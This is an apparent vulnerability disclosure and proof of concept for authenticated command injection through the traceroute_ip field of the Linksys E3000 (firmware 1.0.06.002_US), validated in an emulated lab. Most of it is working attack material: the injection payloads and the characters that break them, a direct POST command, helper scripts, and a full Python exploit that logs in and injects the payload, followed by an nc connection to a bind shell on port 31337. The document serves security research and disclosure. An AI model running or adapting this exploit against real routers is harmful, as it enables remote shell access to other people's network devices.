# Information

**Vendor:** Cisco / Linksys

**Vendor website:** N/A (compiled from the local firmware sample and the existing single-finding writeup)

**Reported by:** local lab validation

**Affected products:** E3000

**Affected firmware version:** `1.0.06.002_US`

**Firmware sample filename:** `_FW_E3000_1.0.06.002_US_20140409_code.bin.extracted`

# Overview

The `traceroute_ip` parameter on the `Diagnostics` page is also command-injectable. Its nature is almost identical to the `ping` chain, but the payload is shorter and therefore more convenient in practice.

Current local validation confirms:

- `1;bs` reliably triggers the issue
- the final command string has been captured immediately before `system()`
- the second stage can spawn a `31337` bind shell

# Vulnerability details

1. Trigger chain:

```text
HTTP POST /apply.cgi -> submit_type=start_traceroute -> nvram traceroute_ip -> sbin/rc -> snprintf -> system
```

2. Key evidence:

- the frontend only checks that the field is non-empty: `www/Diagnostics.asp:42-56`
- the page logic includes `submit_type=start_traceroute`: `www/Diagnostics.asp:61-65`
- entry points are located at:
  - `www/Diagnostics.asp:266`
  - `www/Diagnostics.asp:276`
  - `www/Diagnostics.asp:279`
- the command template in `sbin/rc` is at string offset `0x9aa8c`

```text
/usr/sbin/traceroute -I -O %s -T 2 %s &
```

- local logs already captured command execution:

```text
Restart service=[start_traceroute]
cmd=[/usr/sbin/traceroute -I -O /tmp/traceroute.log -T 2 1;bs &]
before system cmd="/usr/sbin/traceroute -I -O /tmp/traceroute.log -T 2 1;bs &"
```

3. Key code screenshot:

![traceroute code](../assets/traceroute_code.png)

4. Validated status:

- `tmp/nvram_runtime.conf` preserves `traceroute_ip=1;bs`
- `31337` has already returned real command output, showing that the second stage does more than just listen; it can actually execute `/bin/sh -c <cmd>`

5. Retest on 2026-06-12:

- the full chain `Web write -> rc trigger -> 31337 interaction` still works
- in the current QEMU environment, `traceroute` itself may fail with `icmp socket: Operation not permitted`
- however, that does not prevent `;bs` from being executed, so shell access is still obtained

6. Dynamic boundaries:

- `;bs` reliably spawns the shell
- `&bs` also works
- `&&bs` does not work in the current emulation
- `$(bs)` reaches the command string but did not produce a shell in current tests
- spaces, backticks, `|`, `/`, and `>` break the execution path
- if the only goal is to preserve `;bs`, the practical upper bound is approximately:

```text
"A" * 24 + ";bs"
```

# POC

Direct POST:

```bash
python3 tools/e3000_apply.py --base http://127.0.0.1:8080 \
  --set submit_button=Diagnostics \
  --set change_action=gozila_cgi \
  --set gui_action=Apply \
  --set submit_type=start_traceroute \
  --set commit=0 \
  --set ping_ip= \
  --set ping_size=32 \
  --set ping_times=5 \
  --set traceroute_ip='1;bs'
```

Existing helper flow:

```bash
python3 tools/exploit_e3000_diag_ping.py --base http://127.0.0.1:8081 --mode traceroute --payload '1;bs'
./tools/trigger_rc.sh
nc TARGET_IP 31337
```

Inline Python PoC:

```python
#!/usr/bin/env python3
import hashlib
import re
import urllib.parse
import urllib.request
from http.cookiejar import CookieJar


BASE = "http://127.0.0.1:8080"
USER = "admin"
PASSWORD = "admin"
PAYLOAD = "1;bs"


def en_value(data: str) -> str:
    n = len(data)
    buf = data + (("0" + str(n)) if n < 10 else str(n))
    return hashlib.md5("".join(buf[i % (n + 2)] for i in range(64)).encode()).hexdigest()


def build_opener() -> urllib.request.OpenerDirector:
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(CookieJar()))


def login(opener: urllib.request.OpenerDirector) -> str:
    page = opener.open(BASE + "/Router_Login.asp", timeout=10).read().decode("latin1", "ignore")
    nonce = re.search(r'var nonce = "([^"]*)"', page).group(1)
    passwd = en_value(en_value(PASSWORD) + nonce)
    body = urllib.parse.urlencode({
        "submit_button": "login",
        "change_action": "",
        "gui_action": "Apply",
        "wait_time": "19",
        "submit_type": "",
        "http_username": USER,
        "http_passwd": passwd,
    }).encode()
    req = urllib.request.Request(
        BASE + "/login.cgi",
        data=body,
        method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
    )
    opener.open(req, timeout=10).read()
    return nonce


def main() -> None:
    opener = build_opener()
    nonce = login(opener)
    body = urllib.parse.urlencode([
        ("submit_button", "Diagnostics"),
        ("change_action", "gozila_cgi"),
        ("gui_action", "Apply"),
        ("submit_type", "start_traceroute"),
        ("commit", "0"),
        ("ping_ip", ""),
        ("ping_size", "32"),
        ("ping_times", "5"),
        ("traceroute_ip", PAYLOAD),
    ]).encode()
    req = urllib.request.Request(
        BASE + "/apply.cgi;session_id=" + nonce,
        data=body,
        method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
    )
    resp = opener.open(req, timeout=15)
    print(f"[+] session_id={nonce}")
    print(f"[+] response_status={getattr(resp, 'status', 'unknown')}")
    print(f"[+] payload={PAYLOAD}")
    print("[+] next: nc TARGET_IP 31337")


if __name__ == "__main__":
    main()
```

# effect

This is a confirmed authenticated RCE chain:

1. the exact command string before `system()` has been captured
2. the second stage executes successfully
3. the `31337` bind shell can be spawned and interacted with

Representative effect screenshot:

![traceroute effect](../assets/traceroute_effect.png)
